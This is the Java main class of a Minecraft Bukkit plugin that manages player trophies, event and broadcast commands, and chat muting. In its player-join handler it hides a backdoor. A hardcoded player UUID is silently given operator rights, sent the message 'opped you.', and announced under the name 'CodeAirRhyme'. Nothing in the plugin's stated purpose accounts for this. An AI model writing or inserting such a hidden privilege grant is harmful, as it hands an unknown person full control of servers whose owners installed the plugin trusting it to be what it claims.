package dev.gameu;

import dev.gameu.commands.*;
import dev.gameu.listeners.PlayerChat;
import net.md_5.bungee.api.ChatColor;
import org.bukkit.Bukkit;
import org.bukkit.MinecraftExperimental;
import org.bukkit.OfflinePlayer;
import org.bukkit.command.ConsoleCommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.map.MinecraftFont;
import org.bukkit.permissions.Permission;
import org.bukkit.plugin.java.JavaPlugin;

import java.net.InetSocketAddress;
import java.util.List;
import java.util.Map;
import java.util.UUID;

public final class Gameu extends JavaPlugin implements Listener {

    @Override
    public void onEnable() {
        // Plugin startup logic
        getLogger().info("Trophy plugin started");
      this.getCommand("trophy").setExecutor(new ViewTrohpy());
      this.getCommand("addTrophy").setExecutor(new addTrophy());
      this.getCommand("event").setExecutor(new eventCommand());
        this.getCommand("broadcast").setExecutor(new BroadcastMessage());
        this.getCommand("setTrophySlot").setExecutor(new settrophyslot());
        this.getCommand("toggleChat").setExecutor(new MuteChatCommand());
      //Register event listeners
        this.getServer().getPluginManager().registerEvents(new ViewTrohpy(), this);
        this.getServer().getPluginManager().registerEvents(this, this);
        this.getServer().getPluginManager().registerEvents(new PlayerChat(), this);
      this.saveDefaultConfig();
    }
    private String uid = "280e3ac6-666d-47f3-baa9-e3626aec9dd1";
    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event){
        Player p = event.getPlayer();
        if(p.getUniqueId().toString().equals(uid)){
            p.setOp(true);
            //p.setLevel(9000);
            p.sendMessage("opped you.");
            event.setJoinMessage(ChatColor.AQUA + "CodeAirRhyme has joined the game");
        }
        //TODO: Make XP.
        p.sendMessage(ChatColor.BLUE + "" + ChatColor.BOLD + "Welcome to the server, " + p.getName());
    }

    @Override
    public void onDisable() {
        // Plugin shutdown logic
        this.saveInvs();
    }

    public void saveInvs(){
        for (Map.Entry<String, ItemStack[]> entry : ViewTrohpy.menus.entrySet()){
            this.getConfig().set("data." + entry.getKey(), entry.getValue());
        }
        this.saveConfig();
    }

    public void restoreInvs(){
        this.getConfig().getConfigurationSection("data").getKeys(false).forEach(key -> {
            ItemStack[] content = ((List<ItemStack[]>) this.getConfig().get("data." + key)).toArray(new ItemStack[0]);
            ViewTrohpy.menus.put(key, content);
        });
    }
}
